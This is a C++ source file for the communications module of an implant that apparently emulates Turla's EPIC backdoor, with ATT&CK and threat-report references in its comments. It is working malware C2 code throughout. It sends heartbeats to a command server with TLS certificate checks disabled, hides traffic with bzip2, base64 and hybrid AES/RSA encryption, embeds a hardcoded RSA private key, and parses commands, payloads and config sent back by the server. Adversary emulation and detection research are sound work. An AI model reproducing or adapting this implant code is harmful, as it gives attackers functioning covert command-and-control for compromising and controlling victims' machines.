#include "comms.h"
#include <assert.h>

CryptoPP::AutoSeededRandomPool prng;

CryptoPP::SecByteBlock generateKey() {

    CryptoPP::SecByteBlock key(AES_KEY_SIZE);
    prng.GenerateBlock(key, key.size());

    return key;
}

// AESEncrypt
//      About:
//          Helper function performing AES encryption using the provided key. A 16 byte IV is
//          generated for each encryption. 
//      Result:
//          Vector of unsigned char representing the encrypted data
//      MITRE ATT&CK Techniques:
//          T1573.001 Encrypted Channel: Symmetric Cryptography
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//          https://securelist.com/the-epic-turla-operation/65545/
//      Other References:
//          
std::vector<unsigned char> AESEncrypt(std::vector<unsigned char> plaintext, CryptoPP::SecByteBlock key) {

    std::vector<unsigned char> ciphertext;

    // generate IV
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    prng.GenerateBlock(iv, sizeof(iv));
    CryptoPP::byte* iv_ptr = &iv[0];
    
    // encrypt plaintext
    CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption e;
    e.SetKeyWithIV(key, AES_KEY_SIZE, iv_ptr);
    CryptoPP::VectorSource vs(plaintext, true,
        new CryptoPP::StreamTransformationFilter(e,
            new CryptoPP::VectorSink(ciphertext)
        )
    );

    // create new vector to hold iv and ciphertext
    size_t iv_cipher_len = CryptoPP::AES::BLOCKSIZE + ciphertext.size();
    std::vector<unsigned char> iv_and_ciphertext = std::vector<unsigned char>(iv_cipher_len);
    
    // insert IV into new vector
    for (int i = 0; i < CryptoPP::AES::BLOCKSIZE; i++) {
        iv_and_ciphertext[i] = (unsigned char)iv[i];
    }

    // insert ciphertext after IV into new vector
    iv_and_ciphertext.insert(iv_and_ciphertext.begin() + CryptoPP::AES::BLOCKSIZE, ciphertext.begin(), ciphertext.end());
    iv_and_ciphertext.resize(iv_cipher_len);

    return iv_and_ciphertext;
}

// AESDecrypt
//      About:
//          Helper function performing AES decryption using the provided key. It is assumed the IV
//          was prepended to the ciphertext.
//      Result:
//          Vector of unsigned char representing the unencrypted data
//      MITRE ATT&CK Techniques:
//          T1573.001 Encrypted Channel: Symmetric Cryptography
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//          https://securelist.com/the-epic-turla-operation/65545/
//      Other References:
//       
std::vector<unsigned char> AESDecrypt(std::vector<unsigned char> iv_cipher, CryptoPP::SecByteBlock key) {
    std::vector<unsigned char> plaintext;

    // extract IV from blob
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    memcpy(iv, iv_cipher.data(), CryptoPP::AES::BLOCKSIZE);
    std::vector<unsigned char> ciphertext(iv_cipher.begin() + CryptoPP::AES::BLOCKSIZE, iv_cipher.end());
    CryptoPP::byte* iv_ptr = &iv[0];

    // decrypt using key and extracted IV
    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption d;
    d.SetKeyWithIV(key, key.size(), iv_ptr);
    CryptoPP::VectorSource vs(ciphertext, true,
        new CryptoPP::StreamTransformationFilter(d,
            new CryptoPP::VectorSink(plaintext)
        )
    );
    return plaintext;
}

// RSAEncrypt
//      About:
//          Helper function performing RSA encryption on the provided AES key.
//      Result:
//          Vector of unsigned char representing the encrypted data
//      MITRE ATT&CK Techniques:
//          T1573.002 Encrypted Channel: Asymmetric Cryptography
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//          https://securelist.com/the-epic-turla-operation/65545/
//      Other References:
//       
std::vector<unsigned char> RSAEncrypt(CryptoPP::SecByteBlock aes_key) {
    // Load server's RSA public key
    std::string pub_str = "MIIBCgKCAQEAstMVvgSi/YAppi1E4ToYS814d951GBa2UH4xzsT3nuGr3zhriYv/W5X2nEkrRS3/yeB+dxmMq/u4LmPiOo6Zjzw8xgfCQq4j8Enib2z+XAHGbysoCvF09Gk/Cx7hCjl5iu/aFbRRmODPAROdyj5opdQvam0IgS2k7K02S6cofPw2OBaB1E4bY8TiQSc8ysnI7Z1jSDwuwFWYrGTR8oYSbq85nMbrJx742y/bWE3ujbg9vaUlN/40urRCZKOLSutD9QVhMk7H7mHycJif3npndDoWM3GnSuwsWuiKZjTaZM1EBoNEsDa2+gMpNTGF4QWc9Fupmk7L5ujfAXrGBsdwNwIDAQAB";
    CryptoPP::StringSource pub_ss{ pub_str.c_str(), true };
    CryptoPP::ByteQueue queue;
    CryptoPP::Base64Decoder decoder;
    decoder.Attach(new CryptoPP::Redirector(queue));
    pub_ss.TransferTo(decoder);
    decoder.MessageEnd();
    CryptoPP::RSA::PublicKey publicKey;
    publicKey.BERDecodePublicKey(queue, false, queue.MaxRetrievable());

    // base64 encode AES key
    std::string encodedAesKey;
    CryptoPP::StringSource b64_ss(aes_key, aes_key.size(), true,
        new CryptoPP::Base64Encoder(
            new CryptoPP::StringSink(encodedAesKey), false
        ));

    // RSA encrypt AES key
    CryptoPP::RSAES_OAEP_SHA_Encryptor rsaEncryptor(publicKey);
    std::vector<unsigned char> rsa_aes_key;
    CryptoPP::StringSource ss1(encodedAesKey, true,
        new CryptoPP::PK_EncryptorFilter(prng, rsaEncryptor,
            new CryptoPP::VectorSink(rsa_aes_key)
        ) // PK_EncryptorFilter
    ); // StringSource

    return rsa_aes_key;
}

// RSADecrypt
//      About:
//          Helper function performing RSA decryption on the parsed RSA encrypted AES key.
//      Result:
//          Vector of unsigned char representing the unencrypted data
//      MITRE ATT&CK Techniques:
//          T1573.002 Encrypted Channel: Asymmetric Cryptography
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//          https://securelist.com/the-epic-turla-operation/65545/
//      Other References:
//  
CryptoPP::SecByteBlock RSADecrypt(std::vector<unsigned char> parsed_rsa_aes_key) {
    // Load implant RSA private key
    std::string priv_str = "MIIEowIBAAKCAQEAwW0oKmH7vxoenqqYijGD9RALZfAEPC4auVp1wyrQ2j/7sD7ecWcylXgu+3YMqGuUrQdUKswmRMlvLfwiiqeyjFusMi+IILL+Sue5hGKJ5BPGCGO6gl4Hr8WcNCQ7f/idT8x5mvhcSlrTZb/Nit5X5kCZymomQE1dDVwUv+5YSap2zwaqE7oNch6kTBgRut5nZaPqg1NS+V5zrEpoKcu1VQ7cvOwrvdAKQYIfX+04Jg9DNMZDo18wp6lhQ1CEiHP7rxo2znyKYOG9irRX0VIBW8TQbp5flf3GXKJRRmhMtA8Nq3om0P6wMP2cTt6QFevIczhOYnU3ZwnLjxJp3WcSOQIDAQABAoIBAAdFBUghtAOSXwmi9/LkE7il2GyfRDF7OoLldpAviRDvn0bk95kQgiZIkY94eApRnMSSBj5J7ohFGW1QUOYGkaw6+v8Z3TmWMJhITdpYliRUMx9E/3eZD09/LRs8LCy0ZdX5ckdgqgToLyv5G1sERA51A0xIIaIaDKZZyk5AwXqA1MGyuI4J1PKUkQ+tC3rfcFuG0Ig+u30G+8f0YkaYCcK7+IXMv2Ezp/hOGsuA8B2sHsDs3QyEzKPJQjMojP9GW9XJ0Gy0s+Twq5+i6taO4mL5zqrTp0A0vtaY6xLRghd3SBtqBwYzpbIh4gKdJAdALadG058H2Od/3pPlfKJ7UGcCgYEA7IIEW+GB1/moySDmy+5k7UnzrgsVCJBuj5/vlFkdl/xPFSJxPleoPxv/LjLMx/vsauDdN6TFoCYYqxtehs+LgW/581iVO76ynvsv7J4aygyoLKSNMJwUA0KnxftUqWbUDkYNFRcuWZLF8oCf4kldjKG8PnTdeduzah33utYOrnsCgYEA0V4uZjA5tPxp4OwX7X6YQlSQZSSvG4zcDy/0stl+B3Cz4jwB2KYPjx5FGfA3ykOTTzPtlMC5D5En0p8u/p+1bJBgZl6z3sPMzTCfB00ac+1yFwR51kh6Ly2VzclWdMCW828OoXlYszm0e9NXu6eDR1Ft9WXuTa+CW4Vn/zzlvdsCgYBkSLkqcJOLDbypE/9pJ3u6NipSeTaA/CU1V17SK3tl78Fkt8cG5UpdADUS1M2KWuMjapfCuWZnAuBg5WkOhsCjsORub/hPbgv1Z5MppNy9IeLJkzifDP9bZo8XXvvGHOj76G4xrDOmHZs7uZiR7gPx1r6oSQuEWUlZTL23hn6RMwKBgCdSrhpJUn1YrzYsga38ifJjWZ91jWH6SdacZjQ1P0N8enyyUpJzVhbGU6o0gPX/TSqiESxQKjHvTHB1r2jpbDTQxRpVDSl40v1y9Vt0stQ1M6l5EL0bbb9wq2M0PoW9Klzcbf4MAYnf+7MKFb9MDg8WDzX5CBIVNcGkw8yfjnLjAoGBAOCvNGQIVx+sa775Tx3Fyq6+PfvG4ETtMcdlgiJdSXmGIKJ8aboAcuu3hHsasKEcbB0brtqaNi5w/0WgDKAFruh0ZLxZa/UGS2VTNnlXbF/bDUQd28D0KhKAyYV/v3aNf/cZVRsX4qiPfUfCd0oYxS8/rHEgi6qz2PSgAC8KxVuc";
    CryptoPP::RSA::PrivateKey privateKey;
    CryptoPP::StringSource priv_ss{ priv_str.c_str(), true };
    CryptoPP::ByteQueue priv_queue;
    CryptoPP::Base64Decoder priv_decoder;
    priv_decoder.Attach(new CryptoPP::Redirector(priv_queue));
    priv_ss.TransferTo(priv_decoder);
    priv_decoder.MessageEnd();
    privateKey.BERDecodePrivateKey(priv_queue, false, priv_queue.MaxRetrievable());
    assert(priv_queue.IsEmpty());
    
    // rsa decrypt the AES key
    CryptoPP::RSAES_OAEP_SHA_Decryptor rsaDecryptor(privateKey);
    std::string encoded_aes_key;
    CryptoPP::VectorSource vs(parsed_rsa_aes_key, true,
        new CryptoPP::PK_DecryptorFilter(prng, rsaDecryptor,
            new CryptoPP::StringSink(encoded_aes_key)));

    // base64 decode the AES key
    std::string aes_key;
    CryptoPP::Base64Decoder aes_key_decoder;
    aes_key_decoder.Put((CryptoPP::byte*)encoded_aes_key.data(), encoded_aes_key.size());
    aes_key_decoder.MessageEnd();
    CryptoPP::word64 size = aes_key_decoder.MaxRetrievable();
    aes_key.resize(size);
    aes_key_decoder.Get((CryptoPP::byte*)&aes_key[0], aes_key.size());

    // create the AES key from the parsed bytes for use with AESDecrypt
    CryptoPP::byte key_bytes[AES_KEY_SIZE];
    std::copy(aes_key.begin(), aes_key.end(), key_bytes);
    CryptoPP::SecByteBlock parsed_aes_key(key_bytes, AES_KEY_SIZE);

    return parsed_aes_key;
}

namespace comms {
// Wrapper for InternetOpen (wininet.h)
HINTERNET CommsHttpWrapper::InternetOpenWrapper(
    LPCSTR  lpszAgent,
    DWORD   dwAccessType,
    LPCSTR  lpszProxy,
    LPCSTR  lpszProxyBypass,
    DWORD   dwFlags
) {
    return InternetOpenA(
        lpszAgent,
        dwAccessType,
        lpszProxy,
        lpszProxyBypass,
        dwFlags
    );
}

// Wrapper for InternetCloseHandle (wininet.h)
BOOL CommsHttpWrapper::InternetCloseHandleWrapper(HINTERNET hInternet) {
    return InternetCloseHandle(hInternet);
}

// Wrapper for GetLastError (errhandlingapi.h)
DWORD CommsHttpWrapper::GetLastErrorWrapper() {
    return GetLastError();
}

// Wrapper for InternetConnectA (wininet.h)
HINTERNET CommsHttpWrapper::InternetConnectWrapper(
    HINTERNET     hInternet,
    LPCSTR        lpszServerName,
    INTERNET_PORT nServerPort,
    LPCSTR        lpszUserName,
    LPCSTR        lpszPassword,
    DWORD         dwService,
    DWORD         dwFlags,
    DWORD_PTR     dwContext
) {
    return InternetConnectA(
        hInternet,
        lpszServerName,
        nServerPort,
        lpszUserName,
        lpszPassword,
        dwService,
        dwFlags,
        dwContext
    );
}

// Wrapper for HttpOpenRequestA (wininet.h)
HINTERNET CommsHttpWrapper::HttpOpenRequestWrapper(
    HINTERNET hConnect,
    LPCSTR    lpszVerb,
    LPCSTR    lpszObjectName,
    LPCSTR    lpszVersion,
    LPCSTR    lpszReferrer,
    LPCSTR* lplpszAcceptTypes,
    DWORD     dwFlags,
    DWORD_PTR dwContext
) {
    return HttpOpenRequestA(
        hConnect,
        lpszVerb,
        lpszObjectName,
        lpszVersion,
        lpszReferrer,
        lplpszAcceptTypes,
        dwFlags,
        dwContext
    );
}

// Wrapper for HttpSendRequestA (wininet.h)
BOOL CommsHttpWrapper::HttpSendRequestWrapper(
    HINTERNET hRequest,
    LPCSTR    lpszHeaders,
    DWORD     dwHeadersLength,
    LPVOID    lpOptional,
    DWORD     dwOptionalLength
) {
    return HttpSendRequestA(
        hRequest,
        lpszHeaders,
        dwHeadersLength,
        lpOptional,
        dwOptionalLength
    );
}

// Wrapper for InternetReadFile (wininet.h)
BOOL CommsHttpWrapper::InternetReadFileWrapper(
    HINTERNET hFile,
    LPVOID    lpBuffer,
    DWORD     dwNumberOfBytesToRead,
    LPDWORD   lpdwNumberOfBytesRead
) {
    return InternetReadFile(
        hFile,
        lpBuffer,
        dwNumberOfBytesToRead,
        lpdwNumberOfBytesRead
    );
}

// Helper function - Perform the specified HTTP request type for the given address
// Turla has been seen using Windows Internet (WinINet) API calls, such as HttpOpenRequest,
// HttpSendRequest, InternetReadFile, etc for its C2 communications [1].
//
// References: 
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnecta
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile
std::vector<unsigned char> PerformHttpRequest(
    CommsHttpWrapperInterface* comms_http_wrapper,
    LPCSTR address,
    WORD port,
    LPCSTR request_type,
    LPCSTR resource_path,
    LPCSTR additional_headers,
    char* data,
    DWORD data_len,
    DWORD* result_code
) {
    DWORD overall_result = ERROR_SUCCESS;
    std::vector<unsigned char> v_response;
    HINTERNET h_inet = HINTERNET(NULL);
    HINTERNET h_session = HINTERNET(NULL);
    HINTERNET h_request = HINTERNET(NULL);
    LPCSTR accept_types[] = { "*/*", NULL }; // accept any MIME type

    do {
        // initialize usage of WinInet functions
        h_inet = comms_http_wrapper->InternetOpenWrapper(
            DEFAULT_USER_AGENT,        // user agent
            INTERNET_OPEN_TYPE_DIRECT, // resolve host names locally
            NULL,                      // not using proxy servers
            NULL,                      // not using proxy servers
            0                          // no optional flags
        );
        if (h_inet == NULL) {
            overall_result = comms_http_wrapper->GetLastErrorWrapper();
            break;
        }

        // Open HTTP session to C2 server
        h_session = comms_http_wrapper->InternetConnectWrapper(
            h_inet,
            address,
            INTERNET_PORT(port),
            NULL,                  // not passing in username
            NULL,                  // not passing in password
            INTERNET_SERVICE_HTTP,
            0,                     // no optional flags
            (DWORD_PTR)NULL
        );
        if (h_session == NULL) {
            overall_result = comms_http_wrapper->GetLastErrorWrapper();
            break;
        }

        DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
        if (DEFAULT_USE_HTTPS) {
            dwFlags |= INTERNET_FLAG_SECURE;
        }

        // Create HTTP request handle
        h_request = comms_http_wrapper->HttpOpenRequestWrapper(
            h_session,
            request_type,  // HTTP request type (e.g. GET or POST)
            resource_path, // path to HTTP resource (e.g. /PUB/home.html)
            NULL,          // use default HTTP version
            NULL,          // no referrer
            accept_types,
            dwFlags,
            (DWORD_PTR)NULL
        );
        if (h_request == NULL) {
            overall_result = comms_http_wrapper->GetLastErrorWrapper();
            break;
        }

        if (DEFAULT_USE_HTTPS) {
            dwFlags = 0;
            DWORD dwBuffLen = sizeof(dwFlags);
            if (InternetQueryOption(h_request, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen))
            {
                dwFlags |= SECURITY_SET_MASK;
                InternetSetOption(h_request, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
            }
        }

        // Send the HTTP request
        BOOL result = comms_http_wrapper->HttpSendRequestWrapper(
            h_request,
            additional_headers,
            -1L,                // let function auto-calculate length
            (LPVOID)data,
            data_len
        );
        if (!result) {
            overall_result = comms_http_wrapper->GetLastErrorWrapper();
            break;
        }

        // Read response
        char response_buffer[RESP_BUFFER_SIZE];
        DWORD num_bytes_read = 0;
        do {
            result = comms_http_wrapper->InternetReadFileWrapper(
                h_request,
                response_buffer,
                RESP_BUFFER_SIZE,
                &num_bytes_read
            );
            if (!result) {
                overall_result = comms_http_wrapper->GetLastErrorWrapper();
                break;
            }
            v_response.insert(v_response.end(), response_buffer, response_buffer + num_bytes_read);
        } while (num_bytes_read != 0);
    } while (0);

    // Cleanup
    if (h_inet != NULL) comms_http_wrapper->InternetCloseHandleWrapper(h_inet);
    if (h_session != NULL) comms_http_wrapper->InternetCloseHandleWrapper(h_session);
    if (h_request != NULL) comms_http_wrapper->InternetCloseHandleWrapper(h_request);
    *result_code = overall_result;
    return v_response;
}

// Helper function - Perform an HTTP POST request for the given address
// Returns the response and places error code in result_code
std::vector<unsigned char> PerformHttpPostRequest(
    CommsHttpWrapperInterface* comms_http_wrapper,
    LPCSTR address,
    WORD port,
    LPCSTR resource_path,
    LPCSTR additional_headers,
    char* data,
    DWORD data_len,
    DWORD* p_result_code
) {
    return PerformHttpRequest(
        comms_http_wrapper,
        address,
        port,
        "POST",
        resource_path,
        additional_headers,
        data,
        data_len,
        p_result_code
    );
}

// FormatHeartbeatRequest
//      About:
//          Helper function to format the JSON request sent to the C2 server
//      Result:
//          String containing bzip compressed and base64 encoded request
//      MITRE ATT&CK Techniques:
//          T1001: Data Obfuscation
//          T1132.001: Data Encoding: Standard Encoding
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf#page=5
//      Other References:
//
std::string FormatHeartbeatRequest(std::string uuid, std::string type, std::string data, bool encrypt) {
    std::string encodedData = base64_encode(data);
    std::string requestBody = "{\"UUID\":\"" + uuid + "\", \"type\":\"" + type + "\", \"data\":\"" + encodedData + "\"}";

    // bzip2 compress request
    char* requestBodyPlaintext = requestBody.data();
    unsigned int requestBodyPlaintextLen = requestBody.length();

    unsigned int requestBodyBzip2BufLen = std::ceil(requestBodyPlaintextLen * 1.01) + 600; // docs say "allocate an output buffer of size 1%
                                                                                           // larger than the uncompressed data, plus six
                                                                                           // hundred extra bytes"
    char* requestBodyBzip2 = (char*)malloc(requestBodyBzip2BufLen * sizeof(char));
    int ret = BZ2_bzBuffToBuffCompress(requestBodyBzip2, &requestBodyBzip2BufLen, requestBodyPlaintext, requestBodyPlaintextLen, 9, 0, 0);

    const unsigned char* unsignedRequestBodyBzip2 = reinterpret_cast<const unsigned char*>(requestBodyBzip2);
    std::vector<unsigned char> vRequestBodyBzip2(unsignedRequestBodyBzip2, unsignedRequestBodyBzip2 + requestBodyBzip2BufLen);

    // create variables for encryption
    const unsigned char* requestBodyAES;
    unsigned int requestBodyAESLen;
    std::vector<unsigned char> key_iv_ciphertext;

    // the first implant request is not encrypted in accordance with
    // https://securelist.com/the-epic-turla-operation/65545/
    if (encrypt) {
        // aes encrypt request
        CryptoPP::SecByteBlock aes_key = generateKey();
        std::vector<unsigned char> iv_ciphertext = AESEncrypt(vRequestBodyBzip2, aes_key);

        // RSA encrypt AES key
        std::vector<unsigned char> rsa_aes_key = RSAEncrypt(aes_key);

        // prepend RSA-encrypted(AES key) to AES-encrypted(iv + ciphertext)
        size_t total_len = rsa_aes_key.size() + iv_ciphertext.size();  // 2048 key => 256 bytes
        key_iv_ciphertext = std::vector<unsigned char>(total_len);
        key_iv_ciphertext.insert(key_iv_ciphertext.begin(), rsa_aes_key.begin(), rsa_aes_key.end());
        key_iv_ciphertext.insert(key_iv_ciphertext.begin() + rsa_aes_key.size(), iv_ciphertext.begin(), iv_ciphertext.end());
        key_iv_ciphertext.resize(total_len);

        requestBodyAES = reinterpret_cast<const unsigned char*>(&key_iv_ciphertext[0]);
        requestBodyAESLen = total_len;
    }
    else {
        requestBodyAES = reinterpret_cast<const unsigned char*>(requestBodyBzip2);
        requestBodyAESLen = requestBodyBzip2BufLen;
    }

    // base64 encode request
    std::string encodedResponse = base64_encode(requestBodyAES, requestBodyAESLen, false);

    free(requestBodyBzip2);
    return encodedResponse;
}

// ParseC2HTMLResponse
//      About:
//          Helper function to pull out data from the <div> tags in EPIC heartbeat response
//      Result:
//          String containing the data from the C2 server, otherwise empty string
//      MITRE ATT&CK Techniques:
//          
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
//
// Helper function - Pull out base64 encoded data from the <div> tags in EPIC heartbeat response
std::string ParseC2HTMLResponse(std::string& data) {
    std::string startDelim = "<div>";
    std::string stopDelim = "</div>";
    size_t start = data.find(startDelim);
    size_t stop = data.find(stopDelim);
    size_t len = stop - start - startDelim.length();

    if (start != std::string::npos && stop != std::string::npos) {
        return data.substr(start + startDelim.length(), len);
    }
    else {
        return "";
    }
}

// ParseINIConfig
//      About:
//          Helper function to parse config INI (key = value) into a map
//      Result:
//          Map of string to string containing parsed configuration
//      MITRE ATT&CK Techniques:
//          
//      CTI:
//          https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf#page=13
//      Other References:
//          https://stackoverflow.com/questions/38812780/split-string-into-key-value-pairs-using-c
std::map<std::string, std::string> ParseINIConfig(std::string config) {

    std::map<std::string, std::string> m;

    std::string::size_type key_pos = 0;
    std::string::size_type key_end;
    std::string::size_type val_pos;
    std::string::size_type val_end;

    while ((key_end = config.find("=", key_pos)) != std::string::npos)
    {
        if ((val_pos = config.find_first_not_of("= ", key_end)) == std::string::npos)
            break;

        val_end = config.find('\n', val_pos);
        m.emplace(config.substr(key_pos, key_end - key_pos - 1), config.substr(val_pos, val_end - val_pos));

        key_pos = val_end;
        if (key_pos != std::string::npos)
            ++key_pos;
    }

    return m;
}

// ParseC2Instruction
//      About:
//          Helper function to parse commandID, payload size, payload, config size, and config from the C2 server response
//      Result:
//          Instruction struct containing the parsed components from the C2 server response
//      MITRE ATT&CK Techniques:
//          T1001: Data Obfuscation
//          T1132.001: Data Encoding: Standard Encoding
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
//
instruction::Instruction ParseC2Instruction(std::string response) {
    instruction::Instruction parsedInstruction;

    // base64 decode response
    std::vector<unsigned char> decodedResponse = base64_decode(response);

    // pull out RSA-encrypted AES key
    std::vector<unsigned char> parsed_rsa_aes_key(decodedResponse.begin(), decodedResponse.begin() + 256);

    // RSA-decrypt(AES key)
    CryptoPP::SecByteBlock decrypted_aes_key = RSADecrypt(parsed_rsa_aes_key);

    // pull out iv-ciphertext blob from decoded response body
    std::vector<unsigned char> iv_cipher = std::vector<unsigned char>(decodedResponse.size() - 256);
    iv_cipher.insert(iv_cipher.begin(), decodedResponse.begin() + 256, decodedResponse.end());
    iv_cipher.resize(decodedResponse.size() - 256);

    // aes decrypt response
    std::vector<unsigned char> unsDecryptedResponse = AESDecrypt(iv_cipher, decrypted_aes_key);

    // bzip2 decompress response
    char* decryptedResponse = reinterpret_cast<char*>(&unsDecryptedResponse[0]);
    unsigned int decryptedResponseLen = unsDecryptedResponse.size();
    unsigned int decompressedResponseLen = decryptedResponseLen * 10;
    char* decompressedResponseSigned = (char*)malloc(decompressedResponseLen * sizeof(char));

    BZ2_bzBuffToBuffDecompress(decompressedResponseSigned, &decompressedResponseLen, decryptedResponse, decryptedResponseLen, 0, 0);
    unsigned char* decompressedResponse = reinterpret_cast<unsigned char*>(decompressedResponseSigned);

    parsedInstruction.commandID = (uint32_t)decompressedResponse[0] |
        (uint32_t)decompressedResponse[1] << 8 |
        (uint32_t)decompressedResponse[2] << 16 |
        (uint32_t)decompressedResponse[3] << 24;

    uint32_t encodedPayloadSize = (uint32_t)decompressedResponse[4] |
        (uint32_t)decompressedResponse[5] << 8 |
        (uint32_t)decompressedResponse[6] << 16 |
        (uint32_t)decompressedResponse[7] << 24;

    if (encodedPayloadSize != 0) {
        std::string encodedPayload = "";
        for (int i = 0; i < encodedPayloadSize; i++) {
            encodedPayload.push_back(decompressedResponse[8 + i]);
        }
        std::vector<unsigned char> decodedPayload = base64_decode(encodedPayload);
        parsedInstruction.payload = decodedPayload;
        parsedInstruction.payloadSize = decodedPayload.size();
    }

    parsedInstruction.configSize = (uint32_t)decompressedResponse[8 + encodedPayloadSize] |
        (uint32_t)decompressedResponse[9 + encodedPayloadSize] << 8 |
        (uint32_t)decompressedResponse[10 + encodedPayloadSize] << 16 |
        (uint32_t)decompressedResponse[11 + encodedPayloadSize] << 24;

    std::string config = "";
    for (int i = 0; i < parsedInstruction.configSize; i++) {
        config.push_back(decompressedResponse[12 + encodedPayloadSize + i]);
    }

    parsedInstruction.config = ParseINIConfig(config);

    free(decompressedResponseSigned);

    return parsedInstruction;
}

// Heartbeat
//      About:
//          Check in with the C2 server at the specified address and port, adding any data to the request
//      Result:
//          Instruction struct containing C2 server response, otherwise empty Instruction struct
//      MITRE ATT&CK Techniques:
//          T1071.001: Application Layer Protocol: Web Protocols
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
//
instruction::Instruction Heartbeat(CommsHttpWrapperInterface* comms_http_wrapper, LPCSTR address, WORD port, char* data, DWORD data_len) {
    DWORD result_code;

    const TCHAR* szHeaders = _T("Content-Type: application/json");

    std::vector<unsigned char> v_resp = PerformHttpPostRequest(
        comms_http_wrapper,
        address,
        port,
        HEARTBEAT_PATH,
        szHeaders,
        data,
        data_len,
        &result_code
    );
    if (result_code == ERROR_SUCCESS) {
        std::string heartbeat_response(v_resp.begin(), v_resp.end());
        std::string encodedInstruction = ParseC2HTMLResponse(heartbeat_response);
        if (encodedInstruction != "") {
            return ParseC2Instruction(encodedInstruction);
        }
        else {
            return instruction::Instruction();
        }
    }
    return instruction::Instruction();
}

};
